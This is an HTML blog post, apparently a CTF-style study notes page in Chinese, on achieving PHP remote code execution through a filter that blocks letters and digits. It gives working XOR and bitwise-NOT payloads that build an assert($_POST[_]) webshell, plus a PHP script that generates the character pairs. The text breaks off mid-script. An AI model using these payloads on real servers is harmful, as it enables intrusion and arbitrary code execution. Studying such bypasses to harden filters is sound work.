@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="无数字字母RCE核心代码12345678&lt;?phphighlight_file(__FILE__);$code &#x3D; $_GET[&#x27;code&#x27;];if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;    die(&quot;hacker!&quot;);&#125;@eval($code);?&gt;  这里的思路就">
+<meta property="og:type" content="article">
+<meta property="og:title" content="无数字字母RCE学习记录">
+<meta property="og:url" content="http://example.com/2024/03/09/%E6%97%A0%E5%AD%97%E6%AF%8DRCE/index.html">
+<meta property="og:site_name" content="Ed3n&#39;s Blog">
+<meta property="og:description" content="无数字字母RCE核心代码12345678&lt;?phphighlight_file(__FILE__);$code &#x3D; $_GET[&#x27;code&#x27;];if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;    die(&quot;hacker!&quot;);&#125;@eval($code);?&gt;  这里的思路就">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/xRKVB7Md5zJTIk4.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/hNXOnJiDfgxBQlv.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/bIaTjS4VFJ8l69q.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/smvxWOyJXHwUG2N.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/3JL4aIBtZ2ubSip.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/32DfL9smSGYbqzE.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/HL68pxnvTZBG2ac.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/1n3odWxJaLKFVPN.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/D5TbSzqZkdflN3h.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/s2IMFQfh4tYVXeU.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/w2jpKGTMUrkmBSx.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/wlA7FbxYuyGpiMs.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/1MuRev5ANV6BGSm.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/TR3CqlYkZm92UK4.png">
+<meta property="og:image" content="https://www.leavesongs.com/media/attachment/2018/10/06/56de7887-0a22-4b06-9ccd-2951a4bdab4c.624e7ada5f87.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/N2slPLT4Xwphk1W.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/18/4MFmWbe3Ix2JSAn.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/19/hTQJEnGds5X6c83.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/19/RLoFs8nHp13V5TU.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/19/xVkav6YIHjKfgXN.png">
+<meta property="article:published_time" content="2024-03-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-03-09T07:02:11.331Z">
+<meta property="article:author" content="Ed3n">
+<meta property="article:tag" content="命令执行">
+<meta property="article:tag" content="RCE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/11/18/xRKVB7Md5zJTIk4.png">
+
+<link rel="canonical" href="http://example.com/2024/03/09/%E6%97%A0%E5%AD%97%E6%AF%8DRCE/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>无数字字母RCE学习记录 | Ed3n's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ed3n's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/09/%E6%97%A0%E5%AD%97%E6%AF%8DRCE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Ed3n">
+      <meta itemprop="description" content="欢迎光临，我的朋友">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ed3n's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          无数字字母RCE学习记录
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-03-09 00:00:00 / 修改时间：15:02:11" itemprop="dateCreated datePublished" datetime="2024-03-09T00:00:00+08:00">2024-03-09</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" itemprop="url" rel="index"><span itemprop="name">命令执行</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="无数字字母RCE"><a href="#无数字字母RCE" class="headerlink" title="无数字字母RCE"></a>无数字字母RCE</h1><h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的思路就是利用各种非数字字母的字符，经过各种变换（<strong>异或</strong>、<strong>取反</strong>、<strong>自增</strong>），构造出单个的字母字符，然后把单个字符拼接成一个函数名，比如说<code>assert</code>，然后就可以动态执行了。所以说这里的核心就是要将非字母的字符变换成字母字符。</p>
+<h2 id="PHP5"><a href="#PHP5" class="headerlink" title="PHP5"></a>PHP5</h2><h3 id="异或"><a href="#异或" class="headerlink" title="^异或"></a><code>^</code>异或</h3><p>这里的异或，指的是php按位异或，在php中，两个字符进行异或操作后，得到的依然是<strong>一个字符</strong>，所以说当我们想得到<code>a-z</code>中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成<code>ascii码</code>值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：<code>1^1=0,1^0=1,0^1=1,0^0=0</code>，简单的来说就是<strong>相同为零，不同为一</strong>，<code>ascii码</code>表参考如下：</p>
+<p><img src="https://s2.loli.net/2023/11/18/xRKVB7Md5zJTIk4.png" alt="vmfHFZrN9GLSC8j"></p>
+<p>那假如说我们想要构造出小写字母<code>a</code>，按照上表，<code>a</code>的二进制为<code>01100001</code>，那我们就可以选择两个非字母数字的字符进行异或，这里有很多种选法，我选择的是<code>@</code>和<code>!</code>这两个，成功异或出了字母<code>a</code>：</p>
+<p><img src="https://s2.loli.net/2023/11/18/hNXOnJiDfgxBQlv.png" alt="image.png"></p>
+<p>然后我们就可以按照这个方法进行拼接了，我们的目标字符串是<code>assert($_POST[_])</code>，其实很简单，我们需要拼接的字母只有九个而已，拼接结果如下，因为很多都是不可见的字符，所以说我就先url编码了一下（url编码就是它的16进制编码前面加个<code>%</code>哈）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span> ; s:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span> ; s:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span> ; e:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span> ; r:<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span> ; t:<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span></span><br><span class="line">P:<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span> ; O:<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span> ; S:<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span> ; T:<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span></span><br><span class="line">拼接起来：</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);  <span class="comment">// $_=assert</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);  <span class="comment">// $__=_POST</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>; <span class="comment">//$___=$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);<span class="comment">//assert($_POST[_]);</span></span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure>
+
+<p>以上是我自己构造的，经检验没有问题，构造结果可能会有很多种，但方法都是一样的，这样就可以成功进行rce了</p>
+<p><img src="https://s2.loli.net/2023/11/18/bIaTjS4VFJ8l69q.png" alt="image.png"></p>
+<p>或者直接上脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;_POST&quot;</span>;</span><br><span class="line"><span class="variable">$result1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$result2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$num</span>=<span class="number">0</span>;<span class="variable">$num</span>&lt;=<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$num</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">33</span>;<span class="variable">$x</span>&lt;=<span class="number">126</span>;<span class="variable">$x</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$y</span>=<span class="number">33</span>;<span class="variable">$y</span>&lt;=<span class="number">126</span>;<span class="variable">$y</span>++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>)))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$f</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)^<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$f</span> == <span class="variable">$shell</span>[<span class="variable">$num</span>])</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="variable">$result1</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>);</span><br><span class="line">                        <span class="variable">$result2</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">Urlencode</span> (<span class="variable">$result1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#x27;^&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">Urlencode</span> (<span class="variable">$result2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//由于不可见字符的原因，我们还是要进行url编码之后才能正常使用：</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$c</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以得到：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;%21%28%28%25%29%28&#x27;</span>^<span class="string">&#x27;%40%5B%5B%40%5B%5C&#x27;</span>; <span class="comment">//构造出assert</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&#x27;%21%2B%2F%28%28&#x27;</span>^<span class="string">&#x27;%7E%7B%60%7B%7C&#x27;</span>; <span class="comment">//构造出_POST</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$$__</span>; <span class="comment">//$___ = $_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="comment">//assert($_POST[_]);</span></span><br><span class="line"><span class="comment">//放到一排就是</span></span><br><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;%21%28%28%25%29%28&#x27;</span>^<span class="string">&#x27;%40%5B%5B%40%5B%5C&#x27;</span>;<span class="variable">$__</span> = <span class="string">&#x27;%21%2B%2F%28%28&#x27;</span>^<span class="string">&#x27;%7E%7B%60%7B%7C&#x27;</span>;<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure>
+
+<h3 id="取反"><a href="#取反" class="headerlink" title="~取反"></a><code>~</code>取反</h3><h4 id="取反规则"><a href="#取反规则" class="headerlink" title="取反规则"></a>取反规则</h4><h5 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">12</span>;</span><br><span class="line"><span class="variable">$b</span> = ~<span class="variable">$a</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>(-<span class="number">13</span>)</span><br></pre></td></tr></table></figure>
+
+<h5 id="计算过程"><a href="#计算过程" class="headerlink" title="计算过程"></a>计算过程</h5><p>32位表示二进制的12：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000 0000 0000 0000 0000 0000 0000 1100</span><br></pre></td></tr></table></figure>
+
+<p>0与1互换：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1111 1111 1111 1111 1111 1111 1111 0011</span><br></pre></td></tr></table></figure>
+<p>观察0与1互换后的结果：从左向右看，第一位0正1符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-111 1111 1111 1111 1111 1111 1111 0011</span><br></pre></td></tr></table></figure>
+
+<p>负数是用补码表示的，补码是原码取反+1，也就是说</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-111 1111 1111 1111 1111 1111 1111 0011</span><br></pre></td></tr></table></figure>
+
+<p>是某个数取反+1得到的。也就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-111 1111 1111 1111 1111 1111 1111 0010</span><br></pre></td></tr></table></figure>
+
+<p>计算的-13</p>
+<h4 id="如何取反"><a href="#如何取反" class="headerlink" title="如何取反"></a>如何取反</h4><p>取反的好处就是，它每一个字符取反之后都会变成另一个字符，不像异或需要两个字符才能构造出一个字符。</p>
+<h5 id="字母直接取反"><a href="#字母直接取反" class="headerlink" title="字母直接取反"></a>字母直接取反</h5><p>首先，我们想要构造的依然是<code>assert($_POST[_])</code>这条语句，和上面一样，我们先用<code>php</code>的取反符号<code>~</code>将字符串<code>assert</code>和<code>_POST</code>取反，这里需要注意的是，由于它取反之后会有大量不可显字符，所以我们同样需要将其url编码，然后当我们要用的时候，再利用取反符号把它们取回来即可，具体请见下图：</p>
+<p><img src="https://s2.loli.net/2023/11/18/smvxWOyJXHwUG2N.png" alt="image.png"></p>
+<p>可以看到，<code>assert</code>的取反结果是<code>%9E%8C%8C%9A%8D%8B</code>，<code>_POST</code>的取反结果是<code>%A0%AF%B0%AC%AB</code>，那我们就开始构造：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=~(%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B);    <span class="comment">//这里利用取反符号把它取回来，$_=assert</span></span><br><span class="line"><span class="variable">$__</span>=~(%A0%AF%B0%AC%AB);      <span class="comment">//$__=_POST</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;                   <span class="comment">//$___=$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);                 <span class="comment">//assert($_POST[_]);</span></span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>=~(%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B);<span class="variable">$__</span>=~(%A0%AF%B0%AC%AB);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以RCE了</p>
+<p><img src="https://s2.loli.net/2023/11/18/3JL4aIBtZ2ubSip.png" alt="image.png"></p>
+<h5 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h5><p>举个例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&quot;卢&quot;</span>;</span><br><span class="line"><span class="keyword">print</span>(~(<span class="variable">$_</span>&#123;<span class="number">1</span>&#125;));</span><br><span class="line"><span class="keyword">print</span>(~<span class="string">&quot;\x8d&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//输出rr</span></span><br></pre></td></tr></table></figure>
+
+<p>这里之所以会输出两个相同的<code>r</code>，就是因为里面<code>$_&#123;1&#125;</code>就是<code>\x8d</code>，然后这里对<code>\x86</code>进行取反就能得到<code>r</code></p>
+<p>我们需要知道，对于一个汉字进行<code>~($x&#123;0&#125;)</code>或<code>~($x&#123;1&#125;)</code>或<code>~($x&#123;2&#125;)</code>的操作，可以得到某个<code>ascii码</code>的字符值，我们就可以利用这一点构造出<code>webshell</code></p>
+<p>用脚本获得中文字（从3000+个汉字中获得通过取反得到assert）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span 